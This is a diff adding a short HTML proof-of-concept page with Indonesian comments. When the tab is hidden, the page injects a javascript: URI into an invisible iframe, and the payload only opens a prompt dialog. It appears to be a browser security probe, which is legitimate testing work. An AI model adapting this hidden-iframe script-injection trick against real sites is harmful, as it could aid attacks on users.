@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PoC visibilitychange -> iframe</title>
+</head>
+<body>
+  <h3>PoC</h3>
+  <p>Click Here </p>
+
+  <!-- iframe yang akan kita set src-nya -->
+  <iframe id="f" style="width:0;height:0;border:0;visibility:hidden"></iframe>
+
+<script>
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) {
+    try {
+      // langsung set src ke javascript: URI (bisa diblokir di beberapa browser)
+      document.getElementById('f').src = "javascript:prompt('iframe alert')";
+      console.log('Mencoba set iframe.src ke javascript:alert(...)');
+    } catch (e) {
+      console.error('Gagal set iframe.src:', e);
+    }
+  }
+});
+</script>
+</body>
+</html>
